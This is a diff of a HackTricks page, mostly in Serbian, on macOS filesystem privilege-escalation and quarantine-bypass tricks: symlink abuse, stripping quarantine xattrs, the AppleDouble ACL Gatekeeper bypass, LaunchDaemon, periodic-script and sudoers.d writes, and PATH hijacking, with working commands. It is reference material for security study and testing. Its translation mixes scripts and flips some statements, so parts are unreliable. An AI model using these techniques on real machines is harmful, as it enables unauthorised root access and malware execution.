@@ -1,54 +1,55 @@
-# macOS FS Trikovi
+# macOS FS Tricks
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Drugi načini podrške HackTricks-u:
-
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## Kombinacije POSIX dozvola
+## POSIX dozvole kombinacije
 
 Dozvole u **direktorijumu**:
 
-* **čitanje** - možete **izlistati** unose u direktorijumu
+* **čitanje** - možete **nabrojati** unose u direktorijumu
 * **pisanje** - možete **brisati/pisati** **fajlove** u direktorijumu i možete **brisati prazne foldere**.
-* Ali ne možete **brisati/modifikovati neprazne foldere** osim ako imate dozvole za pisanje nad njima.
-* Ne možete modifikovati ime foldera osim ako ga posedujete.
-* **izvršavanje** - dozvoljeno vam je **traverzovati** direktorijum - ako nemate ovu dozvolu, ne možete pristupiti bilo kojim fajlovima unutra, ili u bilo kojim poddirektorijumima.
+* Ali ne možete **brisati/modifikovati neprazne foldere** osim ako nemate dozvolu za pisanje nad njima.
+* Ne možete **modifikovati ime foldera** osim ako ga ne posedujete.
+* **izvršavanje** - **dozvoljeno vam je da prolazite** kroz direktorijum - ako nemate ovo pravo, ne možete pristupiti nijednom fajlu unutar njega, niti u bilo kojim poddirektorijumima.
 
-### Opasne Kombinacije
+### Opasne kombinacije
 
-**Kako prebrisati fajl/folder koji je u vlasništvu root-a**, ali:
+**Kako prepisati fajl/folder koji poseduje root**, ali:
 
-* Jedan roditeljski **direktorijum vlasnik** u putanji je korisnik
-* Jedan roditeljski **direktorijum vlasnik** u putanji je **grupa korisnika** sa **pristupom pisanju**
-* Grupa korisnika ima **pristup pisanju** fajlu
+* Jedan roditeljski **vlasnik direktorijuma** u putanji je korisnik
+* Jedan roditeljski **vlasnik direktorijuma** u putanji je **grupa korisnika** sa **pristupom za pisanje**
+* Grupa korisnika ima **pristup za pisanje** do **fajla**
 
-Sa bilo kojom od prethodnih kombinacija, napadač bi mogao **ubaciti** simbolički ili tvrdi **link** na očekivanu putanju kako bi dobio privilegovano proizvoljno pisanje.
+Sa bilo kojom od prethodnih kombinacija, napadač bi mogao **ubaciti** **sim/link** na očekivanu putanju da bi dobio privilegovano proizvoljno pisanje.
 
-### Poseban slučaj Folder root R+X
+### Folder root R+X Poseban slučaj
 
-Ako postoje fajlovi u **direktorijumu** gde **samo root ima R+X pristup**, ti fajlovi **nisu dostupni nikome drugom**. Dakle, ranjivost koja omogućava **pomeranje fajla koji je čitljiv za korisnika**, a koji ne može biti pročitan zbog te **restrikcije**, iz ovog foldera **u drugi**, može biti zloupotrebljena da bi se pročitali ti fajlovi.
+Ako postoje fajlovi u **direktorijumu** gde **samo root ima R+X pristup**, ti fajlovi su **nedostupni bilo kome drugom**. Tako da ranjivost koja omogućava **premestiti fajl koji je čitljiv od strane korisnika**, koji ne može biti pročitan zbog te **ograničenja**, iz ovog foldera **u drugi**, može se iskoristiti da se pročitaju ti fajlovi.
 
 Primer u: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)
 
-## Simbolički Link / Tvrdi Link
+## Simbolička veza / Hard veza
 
-Ako privilegovani proces piše podatke u **fajl** koji bi mogao biti **kontrolisan** od strane **korisnika sa manje privilegija**, ili koji bi mogao biti **prethodno kreiran** od strane korisnika sa manje privilegija. Korisnik jednostavno može **usmeriti** na drugi fajl putem Simboličkog ili Tvrdog linka, i privilegovani proces će pisati na taj fajl.
+Ako privilegovani proces piše podatke u **fajl** koji bi mogao biti **kontrolisan** od strane **korisnika sa nižim privilegijama**, ili koji bi mogao biti **prethodno kreiran** od strane korisnika sa nižim privilegijama. Korisnik bi mogao samo **usmeriti na drugi fajl** putem simboličke ili hard veze, i privilegovani proces će pisati na taj fajl.
 
-Proverite u drugim sekcijama gde napadač može **zloupotrebiti proizvoljno pisanje da bi eskalirao privilegije**.
+Proverite u drugim sekcijama gde bi napadač mogao **iskoristiti proizvoljno pisanje za eskalaciju privilegija**.
 
 ## .fileloc
 
-Fajlovi sa ekstenzijom **`.fileloc`** mogu pokazivati na druge aplikacije ili binarne fajlove tako da kada se otvore, aplikacija/binarni fajl će biti izvršen.\
+Fajlovi sa **`.fileloc`** ekstenzijom mogu ukazivati na druge aplikacije ili binarne fajlove, tako da kada se otvore, aplikacija/binarni fajl će biti onaj koji se izvršava.\
 Primer:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -62,21 +63,21 @@ Primer:
 </dict>
 </plist>
 ```
-## Proizvoljni FD
+## Arbitrary FD
 
-Ako možete naterati **proces da otvori datoteku ili fasciklu sa visokim privilegijama**, možete zloupotrebiti **`crontab`** da otvori datoteku u `/etc/sudoers.d` sa **`EDITOR=exploit.py`**, tako da će `exploit.py` dobiti FD ka datoteci unutar `/etc/sudoers` i zloupotrebiti je.
+Ako možete da **naterate proces da otvori datoteku ili folder sa visokim privilegijama**, možete zloupotrebiti **`crontab`** da otvorite datoteku u `/etc/sudoers.d` sa **`EDITOR=exploit.py`**, tako da `exploit.py` dobije FD do datoteke unutar `/etc/sudoers` i zloupotrebi je.
 
 Na primer: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
-## Trikovi za izbegavanje xattrs karantina
+## Izbegavajte trikove sa xattrs karantinom
 
-### Uklonite ga
+### Uklonite to
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
-### uchg / uchange / uimmutable zastava
+### uchg / uchange / uimmutable flag
 
-Ako datoteka/folder ima ovaj atribut nepromenljivosti, neće biti moguće staviti xattr na nju.
+Ako datoteka/folder ima ovu nepromenljivu atribut, neće biti moguće postaviti xattr na nju.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -86,9 +87,9 @@ xattr: [Errno 1] Operation not permitted: '/tmp/asd'
 ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
-### Montiranje defvfs
+### defvfs mount
 
-**Devfs** montiranje **ne podržava xattr**, više informacija na [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
+**devfs** montaža **ne podržava xattr**, više informacija u [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
 ```bash
 mkdir /tmp/mnt
 mount_devfs -o noowners none "/tmp/mnt"
@@ -99,7 +100,7 @@ xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
 ```
 ### writeextattr ACL
 
-Ova ACL sprečava dodavanje `xattrs` datoteci.
+Ova ACL sprečava dodavanje `xattrs` na datoteku
 ```bash
 rm -rf /tmp/test*
 echo test >/tmp/test
@@ -122,13 +123,13 @@ ls -le /tmp/test
 ```
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**AppleDouble** format datoteke kopira datoteku zajedno sa svojim ACE-ovima.
+**AppleDouble** формат фајла копира фајл укључујући његове ACE-ове.
 
-U [**izvornom kodu**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) moguće je videti da se ACL tekstualna reprezentacija čuva unutar xattr-a nazvanog **`com.apple.acl.text`** i postavlja se kao ACL u dekompresovanoj datoteci. Dakle, ako ste kompresovali aplikaciju u zip datoteku sa **AppleDouble** formatom datoteke sa ACL-om koji sprečava pisanje drugih xattr-ova u nju... karantinski xattr nije postavljen u aplikaciju:
+У [**изворном коду**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) је могуће видети да ће текстуална репрезентација ACL-а која се чува у xattr-у под називом **`com.apple.acl.text`** бити постављена као ACL у распакованом фајлу. Дакле, ако сте компримовали апликацију у zip фајл са **AppleDouble** форматом фајла са ACL-ом који спречава да се други xattrs запишу у њега... xattr за карантин није био постављен у апликацију:
 
-Proverite [**originalni izveštaj**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) za više informacija.
+Проверите [**оригинални извештај**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) за више информација.
 
-Da biste replicirali ovo, prvo moramo dobiti tačan ACL string:
+Да бисмо то реплицирали, прво морамо добити исправан acl стринг:
 ```bash
 # Everything will be happening here
 mkdir /tmp/temp_xattrs
@@ -146,19 +147,19 @@ ditto -c -k del test.zip
 ditto -x -k --rsrc test.zip .
 ls -le test
 ```
-(Notea da čak i ako ovo funkcioniše, sandbox upisuje karantinski xattr pre)
+(Note that even if this works the sandbox write the quarantine xattr before)
 
-Nije baš potrebno, ali ostavljam to tamo samo u slučaju:
+Nije baš potrebno, ali ostavljam to tu za svaki slučaj:
 
 {% content-ref url="macos-xattr-acls-extra-stuff.md" %}
 [macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
 {% endcontent-ref %}
 
-## Zaobilaženje Koda Potpisa
+## Obilaženje kodnih potpisa
 
-Bundles sadrže datoteku **`_CodeSignature/CodeResources`** koja sadrži **hash** svake pojedinačne **datoteke** u **bundle**-u. Imajte na umu da je hash CodeResources-a takođe **ugrađen u izvršnu datoteku**, tako da s tim ne možemo manipulisati.
+Paketi sadrže datoteku **`_CodeSignature/CodeResources`** koja sadrži **hash** svake pojedinačne **datoteke** u **paketu**. Imajte na umu da je hash CodeResources takođe **ugrađen u izvršni fajl**, tako da ne možemo ni s tim da se igramo.
 
-Međutim, postoje neke datoteke čji potpis neće biti proveren, one imaju ključ za izostavljanje u plist-u, kao što je:
+Međutim, postoje neke datoteke čiji se potpis neće proveravati, ove imaju ključ omit u plist-u, kao:
 ```xml
 <dict>
 ...
@@ -202,13 +203,19 @@ Međutim, postoje neke datoteke čji potpis neće biti proveren, one imaju klju�
 ...
 </dict>
 ```
-Moguće je izračunati potpis resursa sa terminala pomoću:
+Moguće je izračunati potpis resursa iz CLI-a sa: 
+
+{% code overflow="wrap" %}
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
 ```
-## Montiranje dmg datoteka
+{% endcode %}
 
-Korisnik može montirati prilagođenu dmg datoteku čak i preko nekih postojećih fascikli. Evo kako možete kreirati prilagođeni dmg paket sa prilagođenim sadržajem:
+## Montiranje dmga
+
+Korisnik može montirati prilagođeni dmg kreiran čak i na postojećim folderima. Ovako možete kreirati prilagođeni dmg paket sa prilagođenim sadržajem:
+
+{% code overflow="wrap" %}
 ```bash
 # Create the volume
 hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
@@ -231,20 +238,20 @@ hdiutil create -srcfolder justsome.app justsome.dmg
 ```
 {% endcode %}
 
-Obično macOS montira disk razgovarajući sa `com.apple.DiskArbitrarion.diskarbitrariond` Mach servisom (koji pruža `/usr/libexec/diskarbitrationd`). Ako dodate parametar `-d` u LaunchDaemons plist fajl i ponovo pokrenete, on će čuvati logove u `/var/log/diskarbitrationd.log`.\
-Međutim, moguće je koristiti alate poput `hdik` i `hdiutil` da komunicirate direktno sa `com.apple.driver.DiskImages` kextom.
+Obično macOS montira disk razgovarajući sa `com.apple.DiskArbitrarion.diskarbitrariond` Mach servisom (koji obezbeđuje `/usr/libexec/diskarbitrationd`). Ako dodate parametar `-d` u LaunchDaemons plist datoteku i ponovo pokrenete, čuvaće logove u `/var/log/diskarbitrationd.log`.\
+Međutim, moguće je koristiti alate kao što su `hdik` i `hdiutil` za direktnu komunikaciju sa `com.apple.driver.DiskImages` kext-om.
 
-## Proizvoljni upisi
+## Arbitrarne pisanja
 
-### Periodični sh skriptovi
+### Periodični sh skripti
 
-Ako vaša skripta može biti tumačena kao **shell skripta** možete prebrisati **`/etc/periodic/daily/999.local`** shell skriptu koja će biti pokrenuta svakog dana.
+Ako vaša skripta može biti interpretirana kao **shell skripta**, mogli biste prepisati **`/etc/periodic/daily/999.local`** shell skriptu koja će se pokretati svaki dan.
 
-Možete **falsifikovati** izvršenje ove skripte sa: **`sudo periodic daily`**
+Možete **fingirati** izvršenje ove skripte sa: **`sudo periodic daily`**
 
-### Demoni
+### Daemoni
 
-Napišite proizvoljni **LaunchDaemon** poput **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** sa plist-om koji izvršava proizvoljnu skriptu kao:
+Napišite arbitrarnu **LaunchDaemon** kao **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** sa plist-om koji izvršava arbitrarnu skriptu kao:
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -261,19 +268,21 @@ Napišite proizvoljni **LaunchDaemon** poput **`/Library/LaunchDaemons/xyz.hackt
 </dict>
 </plist>
 ```
+Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
+
 ### Sudoers File
 
-Ako imate **proizvoljan zapis**, možete kreirati fajl unutar foldera **`/etc/sudoers.d/`** dodeljujući sebi **sudo** privilegije.
+If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
 
-### PATH fajlovi
+### PATH files
 
-Fajl **`/etc/paths`** je jedno od glavnih mesta koje popunjava PATH env promenljivu. Morate biti root da biste ga prepisali, ali ako skripta iz **privilegovanog procesa** izvršava neku **komandu bez punog puta**, možda ćete moći da je **preuzmete** modifikujući ovaj fajl.
+The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.
 
-Takođe možete pisati fajlove u **`/etc/paths.d`** da učitate nove foldere u `PATH` env promenljivu.
+You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
 
-## Generišite fajlove sa dozvolom pisanja kao drugi korisnici
+## Generate writable files as other users
 
-Ovo će generisati fajl koji pripada root-u koji je moguće pisati od strane mene ([**kod odavde**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). Ovo takođe može raditi kao privesc:
+This will generate a file that belongs to root that is writable by me ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). This might also work as privesc:
 ```bash
 DIRNAME=/usr/local/etc/periodic/daily
 
@@ -285,13 +294,13 @@ MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDont
 FILENAME=$(ls "$DIRNAME")
 echo $FILENAME
 ```
-## POSIX Deljena memorija
+## POSIX Deljena Memorija
 
-**POSIX deljena memorija** omogućava procesima u operativnim sistemima koji su u skladu sa POSIX standardom da pristupe zajedničkom memorijskom prostoru, olakšavajući bržu komunikaciju u poređenju sa drugim metodama međuprocesne komunikacije. Uključuje kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, postavljanje njegove veličine pomoću `ftruncate()`, i mapiranje u prostor adresa procesa pomoću `mmap()`. Procesi mogu direktno čitati i pisati u ovaj memorijski prostor. Za upravljanje konkurentnim pristupom i sprečavanje korupcije podataka, često se koriste mehanizmi sinhronizacije poput meksičkih bravica ili semafora. Na kraju, procesi odjavljuju i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, i opciono uklanjaju objekat memorije pomoću `shm_unlink()`. Ovaj sistem je posebno efikasan za efikasnu, brzu IPC u okruženjima gde više procesa treba brzo pristupiti deljenim podacima.
+**POSIX deljena memorija** omogućava procesima u POSIX-kompatibilnim operativnim sistemima da pristupaju zajedničkom memorijskom prostoru, olakšavajući bržu komunikaciju u poređenju sa drugim metodama međuprocesne komunikacije. To uključuje kreiranje ili otvaranje objekta deljene memorije pomoću `shm_open()`, postavljanje njegove veličine pomoću `ftruncate()`, i mapiranje u adresni prostor procesa koristeći `mmap()`. Procesi zatim mogu direktno čitati i pisati u ovaj memorijski prostor. Da bi se upravljalo istovremenim pristupom i sprečila korupcija podataka, mehanizmi sinhronizacije kao što su mutexi ili semafori se često koriste. Na kraju, procesi demapiraju i zatvaraju deljenu memoriju pomoću `munmap()` i `close()`, i opcionalno uklanjaju objekat memorije pomoću `shm_unlink()`. Ovaj sistem je posebno efikasan za brzu IPC u okruženjima gde više procesa treba brzo da pristupi deljenim podacima.
 
 <details>
 
-<summary>Primer koda proizvođača</summary>
+<summary>Primer Koda Proizvođača</summary>
 ```c
 // gcc producer.c -o producer -lrt
 #include <fcntl.h>
@@ -381,30 +390,31 @@ return 0;
 ```
 </details>
 
-## macOS Čuvani deskriptori
+## macOS Zaštićeni Deskriptor
 
-**macOS čuvani deskriptori** su sigurnosna funkcija uvedena u macOS-u kako bi se poboljšala sigurnost i pouzdanost operacija sa **deskriptorima datoteka** u korisničkim aplikacijama. Ovi čuvani deskriptori pružaju način da se povežu određena ograničenja ili "čuvari" sa deskriptorima datoteka, koje sprovodi jezgro.
+**macOS zaštićeni deskriptor** je bezbednosna funkcija uvedena u macOS kako bi se poboljšala sigurnost i pouzdanost **operacija sa deskriptorima datoteka** u korisničkim aplikacijama. Ovi zaštićeni deskriptor pružaju način za povezivanje specifičnih ograničenja ili "čuvara" sa deskriptorima datoteka, koja se sprovode od strane jezgra.
 
-Ova funkcija je posebno korisna za sprečavanje određenih klasa sigurnosnih ranjivosti kao što su **neovlašćen pristup datotekama** ili **trke uslova**. Ove ranjivosti se javljaju kada na primer jedna nit pristupa deskripciji datoteke dajući **drugoj ranjivoj niti pristup nad njom** ili kada deskriptor datoteke **nasleđuje** ranjiv deteći proces. Neke funkcije povezane sa ovom funkcionalnošću su:
+Ova funkcija je posebno korisna za sprečavanje određenih klasa bezbednosnih ranjivosti kao što su **neovlašćen pristup datotekama** ili **trkačke uslove**. Ove ranjivosti se javljaju kada, na primer, jedan nit pristupa opisu datoteke dajući **drugom ranjivom niti pristup** ili kada deskriptor datoteke bude **nasleđen** od ranjivog procesa. Neke funkcije povezane sa ovom funkcionalnošću su:
 
-* `guarded_open_np`: Otvori FD sa čuvarom
-* `guarded_close_np`: Zatvori ga
-* `change_fdguard_np`: Promeni čuvarske zastave na deskriptoru (čak i uklanjanje zaštite čuvara)
+* `guarded_open_np`: Otvara FD sa čuvarom
+* `guarded_close_np`: Zatvara ga
+* `change_fdguard_np`: Menja zastavice čuvara na deskriptoru (čak i uklanjajući zaštitu čuvara)
 
 ## Reference
 
 * [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Drugi načini da podržite HackTricks:
-
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
-* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
